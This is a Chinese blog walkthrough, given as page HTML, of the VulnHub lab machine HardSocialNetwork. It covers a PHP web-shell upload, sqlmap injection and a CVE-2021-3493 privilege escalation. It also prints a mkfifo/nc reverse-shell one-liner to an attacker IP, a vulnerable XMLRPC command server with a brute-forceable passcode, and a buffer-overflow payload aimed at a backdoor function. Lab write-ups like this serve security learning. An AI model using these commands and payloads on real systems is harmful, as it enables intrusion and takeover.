@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>打靶-HardSocialNetwork - Hannibal0x の Blog</title><meta name="Description" content="Hannibal0x的个人学习博客"><meta property="og:title" content="打靶-HardSocialNetwork" />
+<meta property="og:description" content="0x00 准备工作 靶机地址: https://download.vulnhub.com/boredhackerblog/hard_socnet2.ova 难度等级: 高 打靶目标: 取得 root 权限 涉及攻击方法: 主机发现 端口扫描 SQL注入 文件上传 CVE-2021-3493 XMLRPC 逆向工程 动态调试 缓冲区溢出 漏洞利用" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://hannibal0x.github.io/2021-10-25-%E6%89%93%E9%9D%B6-hardsocialnetwork/" /><meta property="og:image" content="https://hannibal0x.github.io/images/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-10-24T16:02:22+00:00" />
+<meta property="article:modified_time" content="2021-10-24T16:02:22+00:00" /><meta property="og:site_name" content="Hannibal0x の Blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://hannibal0x.github.io/images/logo.png"/>
+
+<meta name="twitter:title" content="打靶-HardSocialNetwork"/>
+<meta name="twitter:description" content="0x00 准备工作 靶机地址: https://download.vulnhub.com/boredhackerblog/hard_socnet2.ova 难度等级: 高 打靶目标: 取得 root 权限 涉及攻击方法: 主机发现 端口扫描 SQL注入 文件上传 CVE-2021-3493 XMLRPC 逆向工程 动态调试 缓冲区溢出 漏洞利用"/>
+<meta name="application-name" content="Hannibal0x の Blog">
+<meta name="apple-mobile-web-app-title" content="Hannibal0x の Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/logo.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://hannibal0x.github.io/2021-10-25-%E6%89%93%E9%9D%B6-hardsocialnetwork/" /><link rel="prev" href="https://hannibal0x.github.io/2021-10-15-rsa%E7%BB%83%E4%B9%A0%E8%A1%A5/" /><link rel="next" href="https://hannibal0x.github.io/2021-11-06-dasctf-oct-writeup/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "打靶-HardSocialNetwork",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/hannibal0x.github.io\/2021-10-25-%E6%89%93%E9%9D%B6-hardsocialnetwork\/"
+        },"genre": "posts","keywords": "渗透测试, Web安全","wordcount":  1648 ,
+        "url": "https:\/\/hannibal0x.github.io\/2021-10-25-%E6%89%93%E9%9D%B6-hardsocialnetwork\/","datePublished": "2021-10-24T16:02:22+00:00","dateModified": "2021-10-24T16:02:22+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Hannibal0x"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Hannibal0x の Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" width="32" height="32" />Hannibal0x の Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"><i class='fas fa-book'></i> 文章 </a><a class="menu-item" href="/tags/"><i class='fas fa-tags'></i> 标签 </a><a class="menu-item" href="/categories/"><i class='fas fa-folder'></i> 分类 </a><a class="menu-item" href="/categories/writeup"><i class='fas fa-flag'></i> CTF </a><a class="menu-item" href="/about/"><i class='fas fa-key'></i> 关于 </a><a class="menu-item" href="http://hannibal0x.top" rel="noopener noreffer" target="_blank"><i class='fas fa-history'></i> 旧博客 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="都几岁啦，还这么害羞，让我康康！" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Hannibal0x の Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" width="32" height="32" />Hannibal0x の Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="都几岁啦，还这么害羞，让我康康！" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title=""><i class='fas fa-book'></i>文章</a><a class="menu-item" href="/tags/" title=""><i class='fas fa-tags'></i>标签</a><a class="menu-item" href="/categories/" title=""><i class='fas fa-folder'></i>分类</a><a class="menu-item" href="/categories/writeup" title=""><i class='fas fa-flag'></i>CTF</a><a class="menu-item" href="/about/" title=""><i class='fas fa-key'></i>关于</a><a class="menu-item" href="http://hannibal0x.top" title="" rel="noopener noreffer" target="_blank"><i class='fas fa-history'></i>旧博客</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">打靶-HardSocialNetwork</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Hannibal0x</a></span>&nbsp;<span class="post-category">included in <a href="/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>安全技术</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-10-24">2021-10-24</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1648 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-准备工作">0x00 准备工作</a></li>
+    <li><a href="#0x01-信息搜集">0x01 信息搜集</a></li>
+    <li><a href="#0x02-getshell">0x02 GetShell</a></li>
+    <li><a href="#0x03-提升权限">0x03 提升权限</a></li>
+    <li><a href="#0x04-另一种提权方法">0x04 另一种提权方法</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><div class="has-toc have-toc">
+</div>
+<h2 id="0x00-准备工作">0x00 准备工作</h2>
+<p>靶机地址: <a href="https://download.vulnhub.com/boredhackerblog/hard_socnet2.ova" target="_blank" rel="noreferrer noopener" rel="nofollow" ><a href="https://download.vulnhub.com/boredhackerblog/hard_socnet2.ova" target="_blank" rel="noopener noreffer ">https://download.vulnhub.com/boredhackerblog/hard_socnet2.ova</a></a><br>
+难度等级: 高<br>
+打靶目标: 取得 root 权限</p>
+<p>涉及攻击方法:</p>
+<p>主机发现<br>
+端口扫描<br>
+SQL注入<br>
+文件上传<br>
+CVE-2021-3493<br>
+XMLRPC<br>
+逆向工程<br>
+动态调试<br>
+缓冲区溢出<br>
+漏洞利用代码编写</p>
+<h2 id="0x01-信息搜集">0x01 信息搜集</h2>
+<p>对靶机端口进行扫描。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1515" height="885" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-139.png" alt="" class="wp-image-4222" /> </figure></p>
+<p>访问8000端口时会发现501报错，提示不支持GET请求，用拓展修改请求方式，依旧报错。<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-140.png" alt="" class="wp-image-4223" width="564" height="217" /> </figure></p>
+<p>看看80端口，发现登录需要用邮件的格式。<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-142.png" alt="" class="wp-image-4225" width="377" height="361" /> </figure></p>
+<p>简单注册一个用户。<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-143.png" alt="" class="wp-image-4226" width="318" height="383" /> </figure></p>
+<p>在后台能发现一个疑似管理员的账户，他描述说在系统上运行了有monitor.py。<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-144.png" alt="" class="wp-image-4227" width="594" height="471" /> </figure></p>
+<h2 id="0x02-getshell">0x02 GetShell</h2>
+<p>发现这个地方可以传文件，试下php一句话木马。<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-145.png" alt="" class="wp-image-4229" width="482" height="248" /> </figure></p>
+<p>直接传上去了，没有任何过滤，那就上蚁剑连接！成功拿到了www-data的权限。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1345" height="328" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-146.png" alt="" class="wp-image-4230" /> </figure></p>
+<p>翻一下目录，database文件夹很可疑，进去后看到两个sql文件，当前用户运行不了mysql。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1267" height="557" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-147.png" alt="" class="wp-image-4232" /> </figure></p>
+<p>把这两个文件下载到本地分析，发现了数据库的部分信息，但没什么用。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="2332" height="1022" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-148.png" alt="" class="wp-image-4233" /> </figure></p>
+<p>结合<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-149.png" alt="" class="wp-image-4234" width="230" height="33" /> </figure></p>
+<p>怀疑存在sql注入，测试后成功验证，上sqlmap一把梭。</p>
+<p>bp抓包后，另存为文件r<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-150.png" alt="" class="wp-image-4235" width="466" height="116" /> </figure></p>
+<p>运行<code>sqlmap -r r -p id</code>,接着往下爆破得到管理员的账号密码。<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-151.png" alt="" class="wp-image-4237" width="665" height="133" /> </figure></p>
+<p>但登录admin未发现有价值的信息，这时查看系统内核版本和操作系统版本。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1536" height="211" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-153.png" alt="" class="wp-image-4240" /> </figure></p>
+<h2 id="0x03-提升权限">0x03 提升权限</h2>
+<p>在github上找到CVE-2021-3493的exp<a rel="noreferrer noopener" href="https://github.com/briskets/CVE-2021-3493" target="_blank" rel="nofollow" ><a href="https://github.com/briskets/CVE-2021-3493" target="_blank" rel="noopener noreffer ">https://github.com/briskets/CVE-2021-3493</a></a>,上传后运行。<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-154.png" alt="" class="wp-image-4241" width="533" height="72" /> </figure></p>
+<p>发现提权是成功的，但因为蚁剑的原因自动退出了，这时试着用nc尝试，但nc上不支持-e参数。一种新的反弹shell方式<code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.0.2.4 3333 &gt;/tmp/f</code><figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-156.png" alt="" class="wp-image-4243" width="584" height="95" /> </figure></p>
+<p>再通过<code>python -c &quot;import pty; pty.spawn('/bin/bash')&quot;</code>实现交互式命令行。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1410" height="173" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-157.png" alt="" class="wp-image-4244" /> </figure></p>
+<p>再运行exploit文件，提权成功。<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-158.png" alt="" class="wp-image-4245" width="421" height="102" /> </figure></p>
+<h2 id="0x04-另一种提权方法">0x04 另一种提权方法</h2>
+<p>继续搜集信息，查看到socnet的可疑用户，跳到他的目录下，发现存在monitor.py文件。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1373" height="980" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-159.png" alt="" class="wp-image-4247" /> </figure></p>
+<p>查看下进程<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1879" height="171" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-160.png" alt="" class="wp-image-4249" /> </figure></p>
+<p>查看源代码如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#my remote server management API</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">SimpleXMLRPCServer</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">debugging_pass</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1000</span><span class="p">,</span><span class="mi">9999</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">runcmd</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">results</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">output</span> <span class="o">=</span> <span class="n">results</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="o">+</span> <span class="n">results</span><span class="o">.</span><span class="n">stderr</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">output</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">cpu</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">runcmd</span><span class="p">(</span><span class="s2">&#34;cat /proc/cpuinfo&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mem</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">runcmd</span><span class="p">(</span><span class="s2">&#34;free -m&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">disk</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">runcmd</span><span class="p">(</span><span class="s2">&#34;df -h&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">net</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">runcmd</span><span class="p">(</span><span class="s2">&#34;ip a&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">secure_cmd</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="n">passcode</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">passcode</span><span class="o">==</span><span class="n">debugging_pass</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">         <span class="k">return</span> <span class="n">runcmd</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;Wrong passcode.&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">server</span> <span class="o">=</span> <span class="n">SimpleXMLRPCServer</span><span class="o">.</span><span class="n">SimpleXMLRPCServer</span><span class="p">((</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">,</span> <span class="mi">8000</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">server</span><span class="o">.</span><span class="n">register_function</span><span class="p">(</span><span class="n">cpu</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">server</span><span class="o">.</span><span class="n">register_function</span><span class="p">(</span><span class="n">mem</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">server</span><span class="o">.</span><span class="n">register_function</span><span class="p">(</span><span class="n">disk</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">server</span><span class="o">.</span><span class="n">register_function</span><span class="p">(</span><span class="n">net</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">server</span><span class="o">.</span><span class="n">register_function</span><span class="p">(</span><span class="n">secure_cmd</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">server</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>XMLRPCServer的官方说明在<a rel="noreferrer noopener" href="https://docs.python.org/zh-cn/3/library/xmlrpc.html" target="_blank" rel="nofollow" ><a href="https://docs.python.org/zh-cn/3/library/xmlrpc.html" target="_blank" rel="noopener noreffer ">https://docs.python.org/zh-cn/3/library/xmlrpc.html</a></a>，可以知道服务端是需要通过XMLRPC的方式来请求。这里在本地构造客户端，用cpu函数进行测试。<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-162.png" alt="" class="wp-image-4251" width="487" height="58" /> </figure></p>
+<p>能够成功执行。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1933" height="988" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-161.png" alt="" class="wp-image-4250" /> </figure></p>
+<p>进一步修改代码，爆破passcode。<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-164.png" alt="" class="wp-image-4254" width="359" height="81" /></figure></p>
+<p>修改命令，反弹shell。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1501" height="268" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-165.png" alt="" class="wp-image-4255" /> </figure></p>
+<p>成功拿到权限。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1745" height="316" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-166.png" alt="" class="wp-image-4256" /> </figure></p>
+<p>查看当前目录下的文件，发现有文件存在root权限，然后文件类型为elf。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1917" height="750" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-168.png" alt="" class="wp-image-4258" /> </figure></p>
+<p>运行文件，依次输入字符串，运行结束后产生新文件，查看内容。共有姓名、工作年限、工资、是否遇到困难、抱怨5处入口点。<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-169.png" alt="" class="wp-image-4259" width="412" height="419" /> </figure></p>
+<p>靶机存在peda，而它是gdb的插件，运行<code>gdb -q ./add_record</code>来加载add_record。输入r运行程序。<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-170.png" alt="" class="wp-image-4260" width="573" height="161" /> </figure></p>
+<p>用<code>python3 -c &quot;print('A'*500)&quot;</code>生成一系列的A，测试是否存在缓冲区溢出，发现Explain有问题。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1926" height="1260" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-171.png" alt="" class="wp-image-4262" /> </figure></p>
+<p>EIP存放的是下一条要执行的指令地址，所以要计算出第几个字符被填充到EIP。使用<code>pattern create 100</code>命令生成100个特征字符串。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1641" height="109" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-172.png" alt="" class="wp-image-4263" /> </figure></p>
+<p>输入后使用<code>pattern search</code>找到字符串的位置，可以发现63的位置就是EIP，只要将EIP的下一条地址指向shell命令所在的内存地址，就能提权成功。<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-173.png" alt="" class="wp-image-4265" width="575" height="436" /> </figure></p>
+<p>使用<code>disas main</code>命令，查看main函数的汇编代码，发现了vuln的可疑函数。<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-174.png" alt="" class="wp-image-4267" width="452" height="237" /> </figure></p>
+<p>使用<code>info func</code>，查看当前程序使用的函数，发现了异常的函数。<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-175.png" alt="" class="wp-image-4268" width="324" height="573" /> </figure></p>
+<p><code>disas vuln</code>查看具体执行了哪些指令，其中<code>strcpy</code>函数可能会产生缓冲区溢出。<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-178.png" alt="" class="wp-image-4272" width="533" height="363" /> </figure></p>
+<p><code>disas backdoor</code>查看具体执行了哪些指令，函数调用了<code>setuid</code>和<code>system</code>函数，尝试执行操作系统的指令。或许可以通过执行backdoor函数达到提权的目的。<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-177.png" alt="" class="wp-image-4271" width="533" height="383" /> </figure></p>
+<p>按q退出后，通过python脚本把起始地址<code>0x08048676</code>，写进EIP寄存器。</p>
+<pre class="wp-block-code"><code>python -c "import struct;print('1\n1\n1\n1\n' + 'A' * 62 + struct.pack('I', 0x08048676))" > payload</code></pre><figure class="wp-block-image size-full">
+<p><img loading="lazy" width="1772" height="438" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-180.png" alt="" class="wp-image-4275" /> </figure></p>
+<p>最后执行<code>cat payload - | ./add_record</code>，成功提升权限！<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1667" height="252" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/10/图片-181.png" alt="" class="wp-image-4276" /> </figure></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-10-24</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/2021-10-25-%E6%89%93%E9%9D%B6-hardsocialnetwork/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://hannibal0x.github.io/2021-10-25-%E6%89%93%E9%9D%B6-hardsocialnetwork/" data-title="打靶-HardSocialNetwork" data-hashtags="渗透测试,Web安全"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://hannibal0x.github.io/2021-10-25-%E6%89%93%E9%9D%B6-hardsocialnetwork/" data-hashtag="渗透测试"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://hannibal0x.github.io/2021-10-25-%E6%89%93%E9%9D%B6-hardsocialnetwork/" data-title="打靶-HardSocialNetwork"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://hannibal0x.github.io/2021-10-25-%E6%89%93%E9%9D%B6-hardsocialnetwork/" data-title="打靶-HardSocialNetwork"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 